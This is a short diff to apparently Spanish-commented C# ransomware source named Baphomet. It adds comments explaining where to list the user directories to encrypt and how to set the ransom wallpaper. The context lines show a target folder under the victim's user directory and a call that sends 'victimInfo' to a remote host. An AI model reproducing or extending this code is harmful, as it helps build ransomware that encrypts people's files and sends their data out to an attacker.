@@ -22,6 +22,7 @@ namespace Baphomet
             var userName = Environment.UserName;
 
             //Directorios donde los usuarios suelen guardar sus archivos ("Desktop","Documents","Pictures" etc)
+            //Aqui pondremos los directorios que deseamos cifrar.
             var pathDirs = new[] { "\\Downloads" };
             var  userDir = Path.Combine("C:\\Users\\",userName);
 
@@ -48,6 +49,7 @@ namespace Baphomet
                     netInfo.SendData(victimInfo, host);
             }
             //Cambio el wallpaper Desktop
+            //podemos usar el metodo imageBase64() donde tendremos una imagen default en base64, o tambien podriamos usar UrlImage() para descargar la foto que deseemos.
             var wallpaper = photo.imageBase64();
             photo.ChangeWallpaper(wallpaper,userDir);
 
